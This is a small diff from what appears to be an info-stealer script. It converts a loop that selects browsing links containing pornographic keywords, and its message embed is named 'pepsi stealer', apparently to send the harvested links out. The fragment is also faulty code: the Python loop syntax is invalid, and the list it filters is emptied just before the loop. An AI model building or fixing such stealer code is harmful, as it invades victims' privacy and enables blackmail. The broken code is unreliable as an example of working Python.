@@ -61,11 +61,11 @@ except Exception as e:
 
 link=links.split("\n")
 links=[]
-for (url in links){
-   if (url.includes("porn") || url.includes("hentai") || url.includes("r34" || url.includes("balls") ){
-     links.push(url)
-   }
-}
+for (url in links):
+   if (("porn") in url or ("hentai") in url or ("r34") in url or ("balls") in url ):
+     links.append(url)
+  
+
 
 embed={
     "username": "pepsi stealer",
